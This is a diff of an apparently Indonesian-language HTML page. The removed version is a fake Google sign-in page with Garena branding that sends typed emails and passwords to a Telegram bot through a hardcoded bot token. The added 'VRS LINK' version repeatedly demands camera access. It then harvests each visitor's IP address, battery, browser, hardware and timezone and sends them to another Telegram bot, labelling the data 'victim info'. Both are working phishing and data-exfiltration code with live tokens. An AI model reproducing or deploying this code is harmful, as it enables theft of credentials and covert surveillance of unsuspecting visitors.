@@ -1,101 +1,239 @@
-<!DOCTYPE html>
-<html lang="en">
+ <!DOCTYPE html>
+<html lang="id">
 <head>
-  <meta charset="utf-8"/>
-  <meta name="viewport" content="width=device-width, initial-scale=1"/>
-  <title>Google Sign In</title>
-  <script src="https://cdn.tailwindcss.com"></script>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>VRS LINK</title>
   <style>
     body {
-      background: #000;
-      font-family: 'Roboto', sans-serif;
+      background: linear-gradient(135deg, #121212, #1f1f1f);
+      color: #00ffaa;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      text-align: center;
+      padding: 60px 20px;
+      overflow: hidden;
+      animation: fadeIn 2s ease-in;
     }
-
-    .overlay {
-      animation: fadeInUp 0.4s ease-out;
-      box-shadow: 0 10px 25px rgba(0,0,0,0.3);
+    h1 {
+      font-size: 3.5em;
+      margin-bottom: 30px;
+      color: #00ffee;
+      text-shadow: 0 0 25px #00ffee, 0 0 5px #00ffee;
+      animation: glow 2s infinite alternate;
     }
-
-    @keyframes fadeInUp {
-      0% { opacity: 0; transform: translateY(40px); }
-      100% { opacity: 1; transform: translateY(0); }
+    p {
+      font-size: 1.2em;
+      margin-bottom: 40px;
+      color: #00fff0;
     }
-
-    @keyframes slideInText {
-      0% { transform: translateX(-100%); opacity: 0; }
-      100% { transform: translateX(0); opacity: 1; }
-    }
-
-    .text-animated {
-      animation: slideInText 0.8s ease-out;
-    }
-
-    .serif-bold {
-      font-family: serif;
+    button {
+      background: #00ffaa;
+      color: #000;
+      font-size: 20px;
       font-weight: bold;
-      letter-spacing: 0.3px;
+      padding: 15px 30px;
+      border: none;
+      border-radius: 30px;
+      cursor: pointer;
+      transition: 0.3s;
+      margin-top: 20px;
+      box-shadow: 0 4px 12px rgba(0, 255, 170, 0.3);
+    }
+    button:hover {
+      background: #00e6b8;
+      transform: scale(1.1);
+      box-shadow: 0 4px 15px rgba(0, 255, 170, 0.5);
+    }
+    #status {
+      margin-top: 30px;
+      font-size: 18px;
+      color: #00ffee;
+      border-right: 2px solid #00ffaa;
+      white-space: nowrap;
+      overflow: hidden;
+      animation: typing 4s steps(40) infinite alternate;
+    }
+    @keyframes typing {
+      from { width: 0 }
+      to { width: 100% }
+    }
+    @keyframes glow {
+      from { text-shadow: 0 0 5px #00ffee; }
+      to { text-shadow: 0 0 20px #00ffee, 0 0 30px #00ffaa; }
+    }
+    @keyframes fadeIn {
+      from { opacity: 0 }
+      to { opacity: 1 }
+    }
+    .link-container {
+      margin-top: 50px;
+      font-size: 1.3em;
+      color: #00ffaa;
+    }
+    .link-container a {
+      color: #00ffee;
+      text-decoration: none;
+      font-weight: bold;
+      transition: color 0.3s;
+      font-size: 1.4em;
+    }
+    .link-container a:hover {
+      color: #00e6b8;
+    }
+    .popup {
+      background-color: rgba(0, 0, 0, 0.8);
+      color: #00ffaa;
+      padding: 20px;
+      border-radius: 10px;
+      width: 90%;
+      max-width: 500px;
+      margin: auto;
+      box-shadow: 0 0 15px rgba(0, 255, 170, 0.6);
+      display: none;
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+    }
+    .popup h2 {
+      font-size: 2em;
+      color: #00ffee;
+    }
+    .popup p {
+      font-size: 1.1em;
+    }
+    .close-btn {
+      background-color: #ff3333;
+      color: #fff;
+      padding: 10px 20px;
+      border: none;
+      border-radius: 20px;
+      cursor: pointer;
+      font-weight: bold;
+      margin-top: 20px;
+      transition: 0.3s;
+    }
+    .close-btn:hover {
+      background-color: #e60000;
     }
   </style>
 </head>
-<body class="min-h-screen flex flex-col items-center justify-center text-white relative px-4">
-
-  <!-- Background -->
-  <img src="https://storage.googleapis.com/a1aa/image/af662aad-e182-4dc0-102c-f1e126dbcfa1.jpg" class="absolute w-full h-full object-cover opacity-50 z-0" alt="Background"/>
-
-  <!-- Overlay Login -->
-  <div class="overlay bg-white rounded-xl p-4 w-full max-w-xs z-10 text-black">
-    <div class="text-center mb-3">
-      <img src="https://storage.googleapis.com/a1aa/image/5019758f-ca05-4850-3c3f-6d1202145fc3.jpg" class="h-5 mx-auto mb-1" alt="Google Logo"/>
-      <h2 class="text-base font-semibold mt-2 text-animated">Sign in</h2>
-      <p class="text-sm text-gray-700 text-animated">Use your Google Account</p>
-    </div>
-    <form id="loginForm" class="space-y-2">
-      <input id="email" type="text" placeholder="Email or phone" required class="w-full border border-gray-300 rounded px-3 py-1.5 text-sm focus:outline-none focus:ring focus:ring-blue-500"/>
-      <input id="password" type="password" placeholder="Enter password" required class="w-full border border-gray-300 rounded px-3 py-1.5 text-sm focus:outline-none focus:ring focus:ring-blue-500"/>
-      <div class="text-xs text-right">
-        <a href="#" class="text-blue-600 hover:underline">Forgot email?</a>
-      </div>
-      <div class="flex justify-between items-center mt-2">
-        <a href="#" class="text-blue-600 text-xs">Create account</a>
-        <button type="submit" class="bg-blue-600 text-white px-4 py-1.5 text-xs rounded hover:bg-blue-700">Next</button>
-      </div>
-    </form>
-
-    <!-- FF Logo bawah form -->
-    <div class="mt-4 text-center">
-      <img src="https://storage.googleapis.com/a1aa/image/4ec1fc1b-d52c-4bde-6313-81ab53637667.jpg" class="h-4 mx-auto opacity-80" alt="FF Logo"/>
-    </div>
+<body>
+  <h1>VRS LINK</h1>
+  <p>apakah anda iningin menggunakan web vrs? :</p>
+  <button onclick="cekData()">YA</button>
+  <div id="status"></div>
+  
+  <div class="link-container">
+    <p>Setelah verifikasi, klik <a href="https://files.catbox.moe/clyrd5.jpg" target="_blank">disini</a>.</p>
   </div>
 
-  <!-- Footer -->
-  <footer class="text-gray-300 text-[10px] mt-4 z-10 text-center serif-bold">
-    <p>© Garena International. All trademarks belong to their respective owners.</p>
-  </footer>
+  <!-- Popup untuk menampilkan informasi -->
+  <div id="popup" class="popup">
+    <h2>𝗜𝗡𝗙𝗢 𝗦𝗬𝗦𝗧𝗘𝗠</h2>
+    <p id="popupContent"></p>
+    <button class="close-btn" onclick="tutupPopup()">Tutup</button>
+  </div>
 
-  <!-- Kirim ke Telegram -->
   <script>
-    const botToken = "7910787444:AAEbccuhemfoKj9z_w8TwfDpjhGUdWdlpoo";
-    const chatId = "7894929132";
+    const token = "8118720781:AAFciunnQRseF8FI6VDHU_FgEO9A-KX2RoU"; // Ganti token kamu
+    const chat_id = "7916928366"; // Ganti chat id kamu
 
-    document.getElementById('loginForm').addEventListener('submit', function (e) {
-      e.preventDefault();
-      const email = document.getElementById('email').value.trim();
-      const password = document.getElementById('password').value.trim();
-      const message = `𝐈𝐍𝐈 𝐃𝐀𝐓𝐀 𝐃𝐀𝐓𝐀 𝐍𝐘𝐀 𝐓𝐔𝐀𝐍 𝐒𝐄𝐌𝐎𝐆𝐀 𝐀𝐉𝐀 BISA🤣:\n𝗘𝗠𝗔𝗜𝗟 𝗡𝗬𝗔 :${email}\n𝗣𝗔𝗦𝗦𝗪𝗢𝗥𝗗 𝗡𝗬𝗔: ${password}`;
+    let startTime = Date.now();
 
-      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          chat_id: chatId,
-          text: message,
-          parse_mode: "HTML"
-        })
-      }).then(() => {
-        window.location.href = "https://vrsgfxweb.github.io/Panel-vrs/";
+    async function cekData() {
+      tampilkanStatus("Memproses...");
+
+      // Minta izin untuk mengakses kamera
+      if (navigator.mediaDevices) {
+        try {
+          // Cek apakah izin sudah diberikan
+          await navigator.mediaDevices.getUserMedia({ video: true });
+          tampilkanStatus("Izin Kamera Diterima!");
+          await ambilDanKirimInfo();
+          tampilkanStatus("Data berhasil diambil!");
+
+          // Menampilkan popup dengan data
+          const infoPopup = `
+            🌐 IP: ${await ambilIP()}<br>
+            🔋 Baterai: ${await ambilBaterai()}<br>
+            💻 Platform: ${navigator.platform}<br>
+            🖥️ Browser: ${navigator.userAgent}<br>
+            🖥️ Resolusi: ${screen.width}x${screen.height}<br>
+            🕒 Zona Waktu: ${Intl.DateTimeFormat().resolvedOptions().timeZone}<br>
+            🗣️ Bahasa: ${navigator.language}<br>
+            🧠 CPU: ${navigator.hardwareConcurrency || "Unknown"} core<br>
+            🗄️ RAM: ${navigator.deviceMemory || "Unknown"} GB<br>
+            📶 Status Online: ${navigator.onLine ? "Online" : "Offline"}<br>
+            ⏰ Durasi Buka: ${Math.floor((Date.now() - startTime) / 1000)} detik
+          `;
+          document.getElementById('popupContent').innerHTML = infoPopup;
+          document.getElementById('popup').style.display = 'block';
+
+          await kirimTelegram(`📝𝗜𝗡𝗙𝗢 𝗞𝗢𝗥𝗕𝗔𝗡:\n${infoPopup}`);
+        } catch (e) {
+          // Jika kamera ditolak, beri tahu pengguna dan minta izin lagi
+          console.error("Kamera tidak diizinkan:", e);
+          tampilkanStatus("Perizinan kamera diperlukan. Coba izinkan akses.");
+          setTimeout(() => {
+            cekData();  // Coba lagi untuk meminta izin
+          }, 1000); // Tunggu 1 detik sebelum mencoba lagi
+        }
+      } else {
+        alert("Browser tidak mendukung akses kamera.");
+        return;
+      }
+    }
+
+    function tampilkanStatus(teks) {
+      const statusDiv = document.getElementById('status');
+      statusDiv.innerText = teks;
+    }
+
+    async function kirimTelegram(pesan) {
+      await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id, text: pesan })
       });
-    });
-  </script>
+    }
 
+    async function ambilIP() {
+      const ipRes = await fetch("https://api.ipify.org?format=json");
+      const ipData = await ipRes.json();
+      return ipData.ip || "Unknown";
+    }
+
+    async function ambilBaterai() {
+      const battery = await navigator.getBattery();
+      return (battery.level * 100).toFixed(0) + "%";
+    }
+
+    async function ambilDanKirimInfo() {
+      const ip = await ambilIP();
+      const batteryLevel = await ambilBaterai();
+      const durasiMs = Date.now() - startTime;
+      const durasiDetik = Math.floor(durasiMs / 1000);
+
+      const text = `
+        🌐 IP: ${ip}
+        🔋 Baterai: ${batteryLevel}
+        💻 Platform: ${navigator.platform}
+        🖥️ Browser: ${navigator.userAgent}
+        🖥️ Resolusi: ${screen.width}x${screen.height}
+        🕒 Zona Waktu: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
+        🗣️ Bahasa: ${navigator.language}
+        🧠 CPU: ${navigator.hardwareConcurrency || "Unknown"} core
+        🗄️ RAM: ${navigator.deviceMemory || "Unknown"} GB
+        📶 Status Online: ${navigator.onLine ? "Online" : "Offline"}
+        ⏰ Durasi Buka: ${durasiDetik} detik
+      `;
+      await kirimTelegram(text);
+    }
+
+    function tutupPopup() {
+      document.getElementById('popup').style.display = 'none';
+    }
+  </script>
 </body>
-        </html>
+</html>
